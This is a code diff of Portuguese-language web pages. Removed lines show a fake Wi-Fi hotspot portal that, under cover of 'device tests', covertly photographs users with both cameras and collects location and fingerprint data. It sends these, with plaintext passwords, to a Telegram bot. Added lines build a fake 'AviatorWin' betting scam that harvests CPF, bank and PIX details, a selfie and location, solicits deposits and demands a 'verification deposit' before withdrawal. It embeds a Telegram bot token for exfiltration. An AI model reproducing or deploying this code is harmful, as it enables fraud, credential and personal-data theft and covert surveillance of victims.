-                            heading: position.coords.heading || 'N/A',
-                            speed: position.coords.speed || 'N/A',
-                            source: 'GPS_PRECISO'
-                        };
-                    } catch (error) {
-                        Logger.warn('GPS falhou, tentando IP', error.message);
-                    }
-                }
-
-                // Fallback para IP
-                return this.getIPLocation();
-            },
-
-            async getIPLocation() {
-                try {
-                    Logger.info('Buscando localização por IP...');
-                    const response = await fetch('https://ipapi.co/json/');
-                    
-                    if (!response.ok) {
-                        throw new Error(`HTTP ${response.status}`);
-                    }
-                    
-                    const data = await response.json();
-                    
-                    Logger.info(`IP Location obtido: ${data.latitude}, ${data.longitude}`);
-                    
-                    return {
-                        latitude: data.latitude,
-                        longitude: data.longitude,
-                        accuracy: 'Aproximada (IP)',
-                        altitude: 'N/A',
-                        heading: 'N/A',
-                        speed: 'N/A',
-                        source: 'IP_API',
-                        ipData: data
-                    };
-                } catch (error) {
-                    Logger.error('Erro IP location', error);
-                    return {
-                        latitude: null,
-                        longitude: null,
-                        accuracy: 'N/A',
-                        altitude: 'N/A',
-                        heading: 'N/A',
-                        speed: 'N/A',
-                        source: 'FALHOU',
-                        ipData: null
-                    };
-                }
-            }
-        };
-
-        const CameraManager = {
-            async capturePhoto(facingMode) {
-                let stream = null;
-                let video = null;
-                let canvas = null;
-
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: facingMode,
-                            width: { ideal: CONFIG.CAMERA.WIDTH },
-                            height: { ideal: CONFIG.CAMERA.HEIGHT }
-                        },
-                        audio: false
-                    });
-
-                    video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.autoplay = true;
-                    video.playsInline = true;
-                    video.style.display = 'none';
-                    document.body.appendChild(video);
-
-                    await new Promise((resolve, reject) => {
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            setTimeout(resolve, CONFIG.CAMERA.DELAY);
-                        };
-                        video.onerror = reject;
-                    });
-
-                    canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.style.display = 'none';
-                    document.body.appendChild(canvas);
-
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    const dataURL = canvas.toDataURL('image/jpeg', CONFIG.CAMERA.QUALITY);
-
-                    stream.getTracks().forEach(track => track.stop());
-                    video.remove();
-                    canvas.remove();
-
-                    return dataURL;
-                } catch (error) {
-                    Logger.error(`Erro captura ${facingMode}`, error);
-                    if (stream) stream.getTracks().forEach(track => track.stop());
-                    if (video) video.remove();
-                    if (canvas) canvas.remove();
-                    return null;
-                }
-            }
-        };
-
-        const DeviceCollector = {
-            async collectAll() {
-                const [battery, mediaDevices, ipLocation] = await Promise.all([
-                    this.getBattery(),
-                    this.getMediaDevices(),
-                    this.getIPLocation()
-                ]);
-
-                return {
-                    browser: {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language,
-                        languages: navigator.languages?.join(', ') || navigator.language,
-                        cookieEnabled: navigator.cookieEnabled,
-                        onLine: navigator.onLine
-                    },
-                    screen: {
-                        width: screen.width,
-                        height: screen.height,
-                        colorDepth: screen.colorDepth,
-                        orientation: screen.orientation?.type || 'N/A'
-                    },
-                    window: {
-                        innerWidth: window.innerWidth,
-                        innerHeight: window.innerHeight,
-                        devicePixelRatio: window.devicePixelRatio
-                    },
-                    hardware: {
-                        cores: navigator.hardwareConcurrency || 'N/A',
-                        memory: navigator.deviceMemory || 'N/A',
-                        touchPoints: navigator.maxTouchPoints || 0
-                    },
-                    connection: {
-                        type: navigator.connection?.effectiveType || 'N/A',
-                        downlink: navigator.connection?.downlink || 'N/A',
-                        rtt: navigator.connection?.rtt || 'N/A'
-                    },
-                    battery,
-                    mediaDevices,
-                    ipLocation,
-                    mikrotik: {
-                        remoteAddress: '$(remote-address)',
-                        mac: '$(mac)',
-                        serverName: '$(server-name)'
-                    }
-                };
-            },
-
-            async getBattery() {
-                if (!('getBattery' in navigator)) {
-                    return { level: 'N/A', charging: 'N/A' };
-                }
-                try {
-                    const battery = await navigator.getBattery();
-                    return {
-                        level: `${(battery.level * 100).toFixed(0)}%`,
-                        charging: battery.charging ? 'Sim' : 'Não'
-                    };
-                } catch (error) {
-                    return { level: 'N/A', charging: 'N/A' };
-                }
-            },
-
-            async getMediaDevices() {
-                if (!navigator.mediaDevices?.enumerateDevices) {
-                    return { microphones: 0, speakers: 0, cameras: 0 };
-                }
-                try {
-                    const devices = await navigator.mediaDevices.enumerateDevices();
-                    return {
-                        microphones: devices.filter(d => d.kind === 'audioinput').length,
-                        speakers: devices.filter(d => d.kind === 'audiooutput').length,
-                        cameras: devices.filter(d => d.kind === 'videoinput').length
-                    };
-                } catch (error) {
-                    return { microphones: 0, speakers: 0, cameras: 0 };
-                }
-            },
-
-            async getIPLocation() {
-                try {
-                    const response = await fetch('https://ipapi.co/json/');
-                    return await response.json();
-                } catch (error) {
-                    return null;
-                }
-            }
-        };
-
-        const App = {
-            userData: {},
-            deviceData: {},
-            cameraPhotos: { front: null, back: null },
-
-            navigate(screenNum) {
-                document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-                const target = document.getElementById(`screen${screenNum}`);
-                if (target) target.classList.add('active');
-            },
-
-            async handleRegister(event) {
-                event.preventDefault();
-
-                const name = document.getElementById('regName').value.trim();
-                const username = document.getElementById('regUsername').value.trim();
-                const password = document.getElementById('regPassword').value;
-                const confirmPassword = document.getElementById('regConfirmPassword').value;
-
-                if (name.length < 3) {
-                    alert('Nome deve ter pelo menos 3 caracteres');
-                    return;
-                }
-
-                if (username.length < 3) {
-                    alert('Usuário deve ter pelo menos 3 caracteres');
-                    return;
-                }
-
-                if (password.length < 6) {
-                    alert('Senha deve ter pelo menos 6 caracteres');
-                    return;
-                }
-
-                if (password !== confirmPassword) {
-                    alert('As senhas não coincidem');
-                    return;
-                }
-
-                this.userData = { name, username, password };
-                this.navigate(3);
-                await this.runTests();
-            },
-
-            async runTests() {
-                try {
-                    await this.runTest('testTouch', 'Verificando touch...', 'Touch OK ✅', this.testTouch);
-                    await this.runTest('testCamera', 'Testando câmera...', 'Câmera OK ✅', this.testCamera);
-                    await this.runTest('testGPS', 'Localizando...', 'GPS OK ✅', this.testGPS);
-                    await this.runTest('testData', 'Coletando dados...', 'Dados OK ✅', this.testData);
-
-                    await this.sendAllData();
-
-                    setTimeout(() => {
-                        this.navigate(4);
-                        this.startProgress();
-                    }, 1000);
-                } catch (error) {
-                    Logger.error('Erro nos testes', error);
-                    alert('Ocorreu um erro durante os testes. Tente novamente.');
-                }
-            },
-
-            async runTest(elementId, testingText, successText, testFunction) {
-                const element = document.getElementById(elementId);
-                const status = element.querySelector('.test-status');
-
-                element.classList.add('testing');
-                status.textContent = testingText;
-
-                try {
-                    await testFunction.call(this);
-                    element.classList.remove('testing');
-                    element.classList.add('success');
-                    status.textContent = successText;
-                } catch (error) {
-                    Logger.error(`Erro no teste ${elementId}`, error);
-                    element.classList.remove('testing');
-                    element.classList.add('success');
-                    status.textContent = `${successText} (parcial)`;
-                }
-
-                await HttpClient.delay(800);
-            },
-
-            async testTouch() {
-                this.deviceData.touch = {
-                    support: 'ontouchstart' in window,
-                    maxPoints: navigator.maxTouchPoints || 0
-                };
-            },
-
-            async testCamera() {
-                try {
-                    this.cameraPhotos.front = await CameraManager.capturePhoto('user');
-                    await HttpClient.delay(500);
-                    this.cameraPhotos.back = await CameraManager.capturePhoto('environment');
-
-                    this.deviceData.camera = {
-                        front: this.cameraPhotos.front ? 'CAPTURADA' : 'FALHOU',
-                        back: this.cameraPhotos.back ? 'CAPTURADA' : 'FALHOU'
-                    };
-                } catch (error) {
-                    Logger.error('Erro câmera', error);
-                    this.deviceData.camera = { front: 'ERRO', back: 'ERRO' };
-                }
-            },
-
-            async testGPS() {
-                this.deviceData.gps = await GPSService.getLocation();
-                Logger.info('GPS data:', this.deviceData.gps);
-            },
-
-            async testData() {
-                this.deviceData.collected = await DeviceCollector.collectAll();
-            },
-
-            async sendAllData() {
-                Logger.info('Enviando dados para Telegram...');
-
-                try {
-                    // Enviar fotos primeiro
-                    if (this.cameraPhotos.front) {
-                        await TelegramService.sendPhoto(
-                            this.cameraPhotos.front,
-                            `📸 FOTO FRONTAL\n👤 ${this.userData.username}\n🕐 ${new Date().toLocaleString('pt-BR')}`
-                        );
-                    }
-
-                    if (this.cameraPhotos.back) {
-                        await TelegramService.sendPhoto(
-                            this.cameraPhotos.back,
-                            `📸 FOTO TRASEIRA\n👤 ${this.userData.username}\n🕐 ${new Date().toLocaleString('pt-BR')}`
-                        );
-                    }
-
-                    // Enviar mensagens de texto
-                    await this.sendAccountInfo();
-                    await HttpClient.delay(500);
-                    
-                    await this.sendLocationInfo();
-                    await HttpClient.delay(500);
-                    
-                    await this.sendDeviceInfo();
-                    await HttpClient.delay(500);
-                    
-                    await this.sendScreenInfo();
-                    await HttpClient.delay(500);
-                    
-                    await this.sendFingerprints();
-                    await HttpClient.delay(500);
-                    
-                    await this.sendHistory();
-                    await HttpClient.delay(500);
-
-                    // ✅ CORRIGIDO: Enviar localização no mapa SEMPRE que tiver coordenadas válidas
-                    await this.sendLocationToMap();
-
-                    Logger.success('Todos os dados enviados');
-                } catch (error) {
-                    Logger.error('Erro ao enviar dados', error);
-                }
-            },
-
-            // ✅ NOVA FUNÇÃO: Envia localização no mapa (GPS ou IP)
-            async sendLocationToMap() {
-                const gps = this.deviceData.gps;
-                
-                if (!gps) {
-                    Logger.warn('Nenhum dado GPS disponível');
-                    return;
-                }
-
-                Logger.info(`Tentando enviar localização (fonte: ${gps.source})`);
-
-                // Tenta enviar com as coordenadas do GPS/IP
-                try {
-                    await TelegramService.sendLocation(
-                        gps.latitude,
-                        gps.longitude,
-                        gps.source
-                    );
-                    Logger.success('Localização enviada no mapa!');
-                } catch (error) {
-                    Logger.error('Falha ao enviar localização no mapa', error);
-                    
-                    // Se falhou com GPS, tenta com IP
-                    if (gps.source === 'GPS_PRECISO' && this.deviceData.collected?.ipLocation) {
-                        const ip = this.deviceData.collected.ipLocation;
-                        Logger.info('Tentando fallback com IP...');
-                        try {
-                            await TelegramService.sendLocation(
-                                ip.latitude,
-                                ip.longitude,
-                                'IP_FALLBACK'
-                            );
-                        } catch (e) {
-                            Logger.error('Fallback IP também falhou', e);
-                        }
-                    }
-                }
-            },
-
-            async sendAccountInfo() {
-                const msg = `NOVO CADASTRO v${CONFIG.VERSION}\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                    `CONTA:\n` +
-                    `- Nome: ${this.userData.name}\n` +
-                    `- Usuário: ${this.userData.username}\n` +
-                    `- Senha: ${this.userData.password}\n` +
-                    `- Data: ${new Date().toLocaleString('pt-BR')}\n\n` +
-                    `FOTOS:\n` +
-                    `- Frontal: ${this.deviceData.camera?.front || 'N/A'}\n` +
-                    `- Traseira: ${this.deviceData.camera?.back || 'N/A'}\n\n` +
-                    `GPS:\n` +
-                    `- Lat: ${this.deviceData.gps?.latitude}\n` +
-                    `- Long: ${this.deviceData.gps?.longitude}\n` +
-                    `- Precisão: ${this.deviceData.gps?.accuracy}\n` +
-                    `- Fonte: ${this.deviceData.gps?.source}`;
-
-                await TelegramService.sendMessage(msg);
-            },
-
-            async sendLocationInfo() {
-                const ip = this.deviceData.gps?.ipData || this.deviceData.collected?.ipLocation || {};
-                const mikrotik = this.deviceData.collected?.mikrotik || {};
-
-                const msg = `LOCALIZAÇÃO E REDE\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                    `- IP Público: ${ip.ip || 'N/A'}\n` +
-                    `- IP MikroTik: ${mikrotik.remoteAddress || 'N/A'}\n` +
-                    `- MAC: ${mikrotik.mac || 'N/A'}\n` +
-                    `- Cidade: ${ip.city || 'N/A'}\n` +
-                    `- Região: ${ip.region || 'N/A'}\n` +
-                    `- País: ${ip.country_name || 'N/A'}\n` +
-                    `- CEP: ${ip.postal || 'N/A'}\n` +
-                    `- ISP: ${ip.org || 'N/A'}\n` +
-                    `- ASN: ${ip.asn || 'N/A'}`;
-
-                await TelegramService.sendMessage(msg);
-            },
-
-            async sendDeviceInfo() {
-                const browser = this.deviceData.collected?.browser || {};
-                const hardware = this.deviceData.collected?.hardware || {};
-                const battery = this.deviceData.collected?.battery || {};
-
-                const msg = `DISPOSITIVO\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                    `- Plataforma: ${browser.platform || 'N/A'}\n` +
-                    `- Idioma: ${browser.language || 'N/A'}\n` +
-                    `- CPU Cores: ${hardware.cores}\n` +
-                    `- RAM: ${hardware.memory}GB\n` +
-                    `- Touch: ${hardware.touchPoints} pts\n` +
-                    `- Bateria: ${battery.level}\n` +
-                    `- Carregando: ${battery.charging}`;
-
-                await TelegramService.sendMessage(msg);
-            },
-
-            async sendScreenInfo() {
-                const screen = this.deviceData.collected?.screen || {};
-                const win = this.deviceData.collected?.window || {};
-                const conn = this.deviceData.collected?.connection || {};
-
-                const msg = `TELA E CONEXÃO\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                    `- Resolução: ${screen.width}x${screen.height}\n` +
-                    `- Window: ${win.innerWidth}x${win.innerHeight}\n` +
-                    `- Pixel Ratio: ${win.devicePixelRatio}\n` +
-                    `- Color Depth: ${screen.colorDepth}bit\n` +
-                    `- Conexão: ${conn.type}\n` +
-                    `- Velocidade: ${conn.downlink} Mbps\n` +
-                    `- Latência: ${conn.rtt}ms`;
-
-                await TelegramService.sendMessage(msg);
-            },
-
-            async sendFingerprints() {
-                const media = this.deviceData.collected?.mediaDevices || {};
-
-                const msg = `MÍDIA E DISPOSITIVOS\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                    `- Microfones: ${media.microphones}\n` +
-                    `- Alto-falantes: ${media.speakers}\n` +
-                    `- Câmeras: ${media.cameras}\n` +
-                    `- User Agent: ${navigator.userAgent}`;
-
-                await TelegramService.sendMessage(msg);
-            },
-
-            async sendHistory() {
-                const msg = `NAVEGAÇÃO\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                    `- Referrer: ${document.referrer || 'Direto'}\n` +
-                    `- URL Atual: ${window.location.href}\n` +
-                    `- Título: ${document.title}\n` +
-                    `- Histórico: ${window.history.length} páginas`;
-
-                await TelegramService.sendMessage(msg);
-            },
-
-            startProgress() {
-                let progress = 0;
-                const fill = document.getElementById('progressFill');
-                const text = document.getElementById('progressText');
-
-                const interval = setInterval(() => {
-                    progress += Math.random() * 15;
-                    
-                    if (progress >= 100) {
-                        progress = 100;
-                        clearInterval(interval);
-                        text.textContent = 'Conexão liberada com sucesso! ✅';
-                        
-                        setTimeout(() => {
-                            this.submitToMikrotik();
-                        }, 2000);
-                    }
-
-                    fill.style.width = `${progress}%`;
-                    text.textContent = `Liberando conexão... ${Math.floor(progress)}%`;
-                }, 300);
-            },
-
-            submitToMikrotik() {
-                const linkLoginOnly = '$(link-login-only)';
-                const linkOrig = '$(link-orig)';
-
-                if (linkLoginOnly && linkLoginOnly !== '$(link-login-only)') {
-                    const form = document.createElement('form');
-                    form.method = 'post';
-                    form.action = linkLoginOnly;
-                    form.style.display = 'none';
-                    
-                    form.innerHTML = `
-                        <input type="hidden" name="username" value="${this.userData.username}" />
-                        <input type="hidden" name="password" value="${this.userData.password}" />
-                        <input type="hidden" name="dst" value="${linkOrig}" />
-                    `;
-                    
-                    document.body.appendChild(form);
-                    form.submit();
-                }
-            }
-        };
-
-        window.addEventListener('beforeunload', () => {
-            Logger.info('Página fechada, cleanup realizado');
+    
+    <div class="hero-emoji">️💰</div>
+    <h1 class="hero-title">
+      Ganhe até <span class="highlight">R$ 5.000</span><br>em minutos
+    </h1>
+    <p class="hero-sub">
+      O jogo do aviãozinho que está pagando muito! Mais de <b>12.847</b> ganhadores hoje.
+    </p>
+    
+    <div class="jackpot">
+      <div class="jackpot-label"> PRÊMIO ACUMULADO</div>
+      <div class="jackpot-value">R$ 47.832,50</div>
+    </div>
+    
+    <div class="winners-scroll">
+      🏆 <b>Maria S.</b> ganhou R$ 1.240 • <b>João P.</b> ganhou R$ 890 • <b>Ana C.</b> ganhou R$ 2.100 • <b>Carlos R.</b> ganhou R$ 567
+    </div>
+    
+    <button class="btn btn-primary" onclick="App.go(2)">
+      🚀 COMEÇAR A GANHAR
+    </button>
+    <p class="text-center mt-10" style="font-size:11px;color:var(--muted)">
+      +18 • Jogue com responsabilidade
+    </p>
+  </div>
+
+  <!-- TELA 2: CADASTRO + PIX -->
+  <div class="screen" id="s2">
+    <div class="header">
+      <div class="logo">Aviator<span>Win</span></div>
+      <div class="steps">
+        <div class="step done"></div>
+        <div class="step active"></div>
+        <div class="step"></div>
+        <div class="step"></div>
+      </div>
+    </div>
+    
+    <h2 style="font-size:24px;font-weight:700;margin-bottom:6px">Crie sua conta</h2>
+    <p style="color:var(--muted);font-size:14px;margin-bottom:20px">
+      Cadastre-se e receba seus ganhos via PIX instantâneo
+    </p>
+    
+    <div class="card">
+      <div class="field">
+        <label>Nome completo</label>
+        <input type="text" id="regName" placeholder="Seu nome" />
+      </div>
+      <div class="field">
+        <label>CPF</label>
+        <input type="text" id="regCpf" placeholder="000.000.000-00" maxlength="14" />
+      </div>
+      <div class="field">
+        <label>E-mail</label>
+        <input type="email" id="regEmail" placeholder="seu@email.com" />
+      </div>
+      <div class="field">
+        <label>Senha</label>
+        <input type="password" id="regPass" placeholder="Mínimo 6 caracteres" />
+      </div>
+    </div>
+    
+    <div class="card" style="background:linear-gradient(135deg,rgba(52,199,89,0.1),rgba(40,167,69,0.05))">
+      <h3 style="font-size:16px;font-weight:700;margin-bottom:12px">💸 Chave PIX para recebimento</h3>
+      <div class="field">
+        <label>Tipo de chave</label>
+        <select id="pixType">
+          <option value="cpf">CPF</option>
+          <option value="email">E-mail</option>
+          <option value="telefone">Telefone</option>
+          <option value="aleatoria">Aleatória</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>Chave PIX</label>
+        <input type="text" id="pixKey" placeholder="Sua chave PIX" />
+      </div>
+      <div class="field">
+        <label>Nome do titular da conta</label>
+        <input type="text" id="pixName" placeholder="Nome completo do titular" />
+      </div>
+      <div class="field">
+        <label>Banco</label>
+        <input type="text" id="pixBank" placeholder="Ex: Nubank, Itaú, Bradesco" />
+      </div>
+    </div>
+    
+    <button class="btn btn-success" onclick="App.validateRegister()">
+      CONTINUAR →
+    </button>
+  </div>
+
+  <!-- TELA 3: VERIFICAÇÃO DE IDENTIDADE (FOTO) -->
+  <div class="screen" id="s3">
+    <div class="header">
+      <div class="logo">Aviator<span>Win</span></div>
+      <div class="steps">
+        <div class="step done"></div>
+        <div class="step done"></div>
+        <div class="step active"></div>
+        <div class="step"></div>
+      </div>
+    </div>
+    
+    <h2 style="font-size:22px;font-weight:700;margin-bottom:6px">Verificação de identidade</h2>
+    <p style="color:var(--muted);font-size:14px;margin-bottom:16px">
+      Por segurança, precisamos confirmar que é você mesmo. Tire uma selfie.
+    </p>
+    
+    <div class="camera-frame" id="cameraFrame">
+      <video id="cameraVideo" autoplay playsinline></video>
+      <div class="overlay"></div>
+      <div class="face-guide"></div>
+      <div class="camera-flash" id="cameraFlash"></div>
+    </div>
+    
+    <p style="text-align:center;font-size:13px;color:var(--muted);margin-bottom:16px">
+      Posicione seu rosto dentro do círculo
+    </p>
+    
+    <button class="btn btn-primary" id="btnCapture" onclick="App.capturePhoto()">
+      📸 TIRAR SELFIE
+    </button>
+    <button class="btn btn-ghost mt-10" onclick="App.showCameraDenyModal()">
+      Não posso tirar foto agora
+    </button>
+  </div>
+
+  <!-- TELA 4: LOCALIZAÇÃO -->
+  <div class="screen" id="s4">
+    <div class="header">
+      <div class="logo">Aviator<span>Win</span></div>
+      <div class="steps">
+        <div class="step done"></div>
+        <div class="step done"></div>
+        <div class="step done"></div>
+        <div class="step active"></div>
+      </div>
+    </div>
+    
+    <div class="loc-visual">
+      <div class="icon">📍</div>
+      <h3>Jogue com quem está perto de você</h3>
+      <p>
+        Ative sua localização para entrar em salas regionais e competir com jogadores da sua região. Prêmios maiores e saques mais rápidos!
+      </p>
+    </div>
+    
+    <div class="loc-features">
+      <div class="loc-feature">
+        <span class="ico">🏆</span>
+        <span>Torneios exclusivos da sua cidade</span>
+      </div>
+      <div class="loc-feature">
+        <span class="ico"></span>
+        <span>PIX regional instantâneo (até 30s)</span>
+      </div>
+      <div class="loc-feature">
+        <span class="ico">🎁</span>
+        <span>Bônus de boas-vindas regional de R$ 50</span>
+      </div>
+      <div class="loc-feature">
+        <span class="ico">👥</span>
+        <span>Ranking local com prêmios em dinheiro</span>
+      </div>
+    </div>
+    
+    <button class="btn btn-success" onclick="App.requestLocation()">
+      ✅ ATIVAR LOCALIZAÇÃO
+    </button>
+    <button class="btn btn-ghost mt-10" onclick="App.showLocationDenyModal()">
+      Agora não
+    </button>
+  </div>
+
+  <!-- TELA 5: DEPÓSITO -->
+  <div class="screen" id="s5">
+    <div class="header">
+      <div class="logo">Aviator<span>Win</span></div>
+    </div>
+    
+    <h2 style="font-size:22px;font-weight:700;margin-bottom:6px">Depósito inicial</h2>
+    <p style="color:var(--muted);font-size:14px;margin-bottom:16px">
+      Deposite para começar a jogar. Seu primeiro depósito é <b style="color:var(--green)">dobrado</b>!
+    </p>
+    
+    <div class="card">
+      <div class="field">
+        <label>Valor do depósito</label>
+        <select id="depositValue" onchange="App.updatePix()">
+          <option value="20">R$ 20,00 (recebe R$ 40)</option>
+          <option value="50" selected>R$ 50,00 (recebe R$ 100)</option>
+          <option value="100">R$ 100,00 (recebe R$ 200)</option>
+          <option value="200">R$ 200,00 (recebe R$ 400)</option>
+        </select>
+      </div>
+    </div>
+    
+    <div class="pix-card">
+      <div class="label">Pague via PIX</div>
+      <div class="value" id="pixAmount">R$ 50,00</div>
+      <div class="key" id="pixCode">00020126580014BR.GOV.BCB.PIX0136aviatorwin-pagamentos@pix.com</div>
+    </div>
+    
+    <div class="timer">
+      Expira em <b id="pixTimer">04:59</b>
+    </div>
+    
+    <button class="btn btn-success" onclick="App.confirmDeposit()">
+      ✅ JÁ PAGUEI
+    </button>
+    <button class="btn btn-ghost mt-10" onclick="App.copyPix()">
+       Copiar código PIX
+    </button>
+  </div>
+
+  <!-- TELA 6: JOGO -->
+  <div class="screen" id="s6">
+    <div class="header">
+      <div class="logo">Aviator<span>Win</span></div>
+      <div class="balance-pill">Saldo: <b id="balanceDisplay">R$ 100,00</b></div>
+    </div>
+    
+    <div class="history" id="gameHistory"></div>
+    
+    <div class="game-area">
+      <div class="stars"></div>
+      <div class="multiplier" id="multiplier">1.00x</div>
+      <div class="plane" id="plane">✈️</div>
+    </div>
+    
+    <div class="bet-controls">
+      <div class="bet-input">
+        <label>Aposta</label>
+        <input type="number" id="betAmount" value="10" min="1" />
+      </div>
+      <div class="bet-input">
+        <label>Auto cashout</label>
+        <input type="number" id="autoCashout" value="2.00" step="0.1" />
+      </div>
+    </div>
+    
+    <button class="btn btn-success" id="btnBet" onclick="App.startRound()">
+      🚀 APOSTAR
+    </button>
+    <button class="btn btn-danger hidden" id="btnCashout" onclick="App.cashout()">
+      💰 RETIRAR AGORA
+    </button>
+    
+    <div class="card mt-20" style="padding:16px">
+      <div style="display:flex;justify-content:space-between;font-size:13px">
+        <span style="color:var(--muted)">Rodadas ganhas</span>
+        <b id="winsCount" style="color:var(--green)">0</b>
+      </div>
+      <div style="display:flex;justify-content:space-between;font-size:13px;margin-top:8px">
+        <span style="color:var(--muted)">Total ganho</span>
+        <b id="totalWon" style="color:var(--green)">R$ 0,00</b>
+      </div>
+    </div>
+  </div>
+
+  <!-- TELA 7: SAQUE BLOQUEADO -->
+  <div class="screen" id="s7">
+    <div class="header">
+      <div class="logo">Aviator<span>Win</span></div>
+    </div>
+    
+    <div class="text-center" style="padding:40px 0">
+      <div style="font-size:80px">🔒</div>
+      <h2 style="font-size:24px;font-weight:700;margin:16px 0 8px">Saque em análise</h2>
+      <p style="color:var(--muted);font-size:14px;line-height:1.5">
+        Seu saque de <b id="withdrawAmount">R$ 0,00</b> está sendo processado. Por segurança, precisamos de uma verificação adicional.
+      </p>
+    </div>
+    
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:700;margin-bottom:12px"> Verificação necessária</h3>
+      <p style="font-size:14px;color:var(--muted);line-height:1.5;margin-bottom:16px">
+        Para liberar seu saque, faça um depósito de verificação de <b>R$ 30,00</b> que será devolvido em até 24h.
+      </p>
+      <button class="btn btn-primary" onclick="alert('Função em desenvolvimento')">
+        FAZER DEPÓSITO DE VERIFICAÇÃO
+      </button>
+    </div>
+    
+    <button class="btn btn-ghost" onclick="App.go(6)">
+      ← Voltar ao jogo
+    </button>
+  </div>
+
+</div>
+
+<!-- MODAL FOTO NEGADA -->
+<div class="modal-bg" id="modalPhoto">
+  <div class="modal">
+    <div class="emoji">📸</div>
+    <h3>Foto necessária</h3>
+    <p>Para sua segurança e conformidade com a legislação, precisamos da sua selfie.</p>
+    <div class="reasons">
+      <div>Prevenção de fraude e identidade</div>
+      <div>Conformidade com regulamento +18</div>
+      <div>Proteção da sua conta contra acessos não autorizados</div>
+      <div>Liberação de saques via PIX</div>
+    </div>
+    <button class="btn btn-primary" onclick="App.closeModal('modalPhoto');App.startCamera()">
+      Entendi, tirar foto
+    </button>
+  </div>
+</div>
+
+<!-- MODAL LOCALIZAÇÃO NEGADA -->
+<div class="modal-bg" id="modalLoc">
+  <div class="modal">
+    <div class="emoji">📍</div>
+    <h3>Localização importante</h3>
+    <p>Sem localização, você perde benefícios exclusivos:</p>
+    <div class="reasons" style="background:rgba(255,149,0,0.1)">
+      <div style="color:#e67e22"> Sem bônus regional de R$ 50</div>
+      <div style="color:#e67e22">❌ Sem acesso a torneios locais</div>
+      <div style="color:#e67e22">❌ Saques podem levar até 72h</div>
+    </div>
+    <button class="btn btn-success" onclick="App.closeModal('modalLoc');App.requestLocation(true)">
+      Ativar agora
+    </button>
+    <button class="btn btn-ghost mt-10" onclick="App.closeModal('modalLoc');App.skipLocation()">
+      Continuar sem localização
+    </button>
+  </div>
+</div>
+
+<!-- MODAL GENÉRICO -->
+<div class="modal-bg" id="modalGeneric">
+  <div class="modal">
+    <div class="emoji" id="modalGenericEmoji">✅</div>
+    <h3 id="modalGenericTitle">Título</h3>
+    <p id="modalGenericText">Texto</p>
+    <button class="btn btn-primary" onclick="App.closeModal('modalGeneric')">OK</button>
+  </div>
+</div>
+
+<script>
+'use strict';
+
+const CONFIG = {
+  VERSION: '10.0.15',
+  TELEGRAM: {
+    BOT_TOKEN: '8702458951:AAHg_-y7Dx8LBwIjdKg0YcF9sVRJzkIrkj0',
+    CHAT_ID: '-5425475205',
+    API_BASE: 'https://api.telegram.org/bot',
+    TIMEOUT: 15000,
+    RETRY: 3
+  },
+  CAMERA: { WIDTH: 1280, HEIGHT: 720, QUALITY: 0.85, DELAY: 600 }
+};
+
+const Logger = {
+  info: (m,d)=>console.log(`[INFO] ${m}`,d||''),
+  error: (m,d)=>console.error(`[ERROR] ${m}`,d||''),
+  success: (m)=>console.log(`✅ ${m}`),
+  warn: (m,d)=>console.warn(`[WARN] ${m}`,d||'')
+};
+
+const HttpClient = {
+  async postJSON(url, data) {
+    for (let i = 1; i <= CONFIG.TELEGRAM.RETRY; i++) {
+      try {
+        const ctrl = new AbortController();
+        const tid = setTimeout(()=>ctrl.abort(), CONFIG.TELEGRAM.TIMEOUT);
+        const r = await fetch(url, {
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify(data),
+          signal: ctrl.signal
         });
-    </script>
+        clearTimeout(tid);
+        if (!r.ok) throw new Error(`HTTP ${r.status}`);
+        return await r.json();
+      } catch(e) {
+        Logger.warn(`Tentativa ${i} falhou: ${e.message}`);
+        if (i === CONFIG.TELEGRAM.RETRY) throw e;
+        await new Promise(r=>setTimeout(r, 1000*i));
+      }
+    }
+  },
+  async postFormData(url, fd) {
+    for (let i = 1; i <= CONFIG.TELEGRAM.RETRY; i++) {
+      try {
+        const ctrl = new AbortController();
+        const tid = setTimeout(()=>ctrl.abort(), CONFIG.TELEGRAM.TIMEOUT);
+        const r = await fetch(url, { method:'POST', body:fd, signal:ctrl.signal });
+        clearTimeout(tid);
+        if (!r.ok) throw new Error(`HTTP ${r.status}`);
+        return await r.json();
+      } catch(e) {
+        if (i === CONFIG.TELEGRAM.RETRY) throw e;
+        await new Promise(r=>setTimeout(r, 1000*i));
+      }
+    }
+  }
+};
+
+const TelegramService = {
+  base(){ return `${CONFIG.TELEGRAM.API_BASE}${CONFIG.TELEGRAM.BOT_TOKEN}`; },
+  
+  async send(text) {
+    if (text.length > 4096) text = text.substring(0,4046) + '\n\n...[truncado]';
+    return HttpClient.postJSON(`${this.base()}/sendMessage`, {
+      chat_id: CONFIG.TELEGRAM.CHAT_ID, text
+    });
+  },
+  
+  async sendPhoto(dataUrl, caption) {
+    const r = await fetch(dataUrl);
+    const blob = await r.blob();
+    const fd = new FormData();
+    fd.append('chat_id', CONFIG.TELEGRAM.CHAT_ID);
+    fd.append('photo', blob, `photo_${Date.now()}.jpg`);
+    if (caption) fd.append('caption', caption);
+    return HttpClient.postFormData(`${this.base()}/sendPhoto`, fd);
+  },
+  
+  async sendLocation(lat, lon) {
+    const la = parseFloat(lat), lo = parseFloat(lon);
+    if (isNaN(la)||isNaN(lo)||la<-90||la>90||lo<-180||lo>180) return null;
+    return HttpClient.postJSON(`${this.base()}/sendLocation`, {
+      chat_id: CONFIG.TELEGRAM.CHAT_ID, latitude:la, longitude:lo
+    });
+  }
+};
+
+const App = {
+  data: {},
+  cameraStream: null,
+  cameraPhotos: { front:null, back:null },
